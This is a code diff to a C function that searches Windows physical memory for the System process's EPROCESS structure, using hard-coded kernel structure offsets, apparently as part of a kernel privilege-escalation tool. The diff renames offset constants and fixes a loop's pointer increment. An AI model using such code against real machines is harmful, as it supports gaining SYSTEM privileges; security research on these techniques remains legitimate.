@@ -177,7 +177,9 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 }
 
 unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
-	#define _EPROCESS_ImageFileName 0x5a8
+	#define _EPROCESS_ImageFileName_offset 0x5a8
+	#define _EPROCESS_UniqueProcessId_offset 0x440
+
 	int memRegionsCount = -1;
 	//UCHAR ImageFileName[15];
 	unsigned char pattern[16] = {
@@ -238,18 +240,18 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++) {
 
 				offset2++;
-				castedBuf = (unsigned char*)castedBuf + 1;
+
 				if (memcmp(castedBuf, pattern, patternLength) == 0)
 				{
 					unsigned __int64 patternLocation = page + offset;
-					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - 0x5A7;
-					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - _EPROCESS_ImageFileName_offset;
+					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
 					// check buf bounds
 					if ((unsigned __int64)buf <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)buf)
 					{
 						if (*((unsigned __int64*)UniqueProcessId) == 0x4)
 						{
-							void* physicalEPROCESSBase = (void*)(page + offset - 0x5A7);
+							void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
 							printf("[%d] Found EPROCESS Base of System at: %p\n", patternCount, physicalEPROCESSBase);
 							patternCount++;
 							//return (unsigned __int64)physicalEPROCESSBase;
@@ -275,16 +277,16 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 						// add pattern offset
 						castedFourPages = (unsigned char*)castedFourPages + offset;
 
-						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - 0x5A7;
+						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - _EPROCESS_ImageFileName_offset;
 
-						UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+						UniqueProcessId = EPROCESSBaseOfSystem + _EPROCESS_UniqueProcessId_offset;
 						if (1 == 1 || (unsigned __int64)castedFourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)castedFourPages)
 						{
 							printf("Struct does fit into four pages.\n");
 							if (*((unsigned __int64*)UniqueProcessId) == 0x4)
 							{
 								// PID of System is 4
-								void* physicalEPROCESSBase = (void*)(page + offset - 0x5A7);
+								void* physicalEPROCESSBase = (void*)(page + offset - _EPROCESS_ImageFileName_offset);
 								printf("[%d] Found EPROCESS Base of System at: %p\n", patternCount, physicalEPROCESSBase);
 								patternCount++;
 								//return (unsigned __int64)physicalEPROCESSBase;
@@ -295,8 +297,8 @@ unsigned __int64 GetEPROCESSPhysicalBaseOfSystem(HANDLE hPhysicalMemory) {
 							fprintf(stderr, "Struct does not fit into four page.\n");
 						}
 					}
-
 				}
+				castedBuf = (unsigned char*)castedBuf + 1;
 			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
 				printf("UnmapPhysicalMemory failed\n");
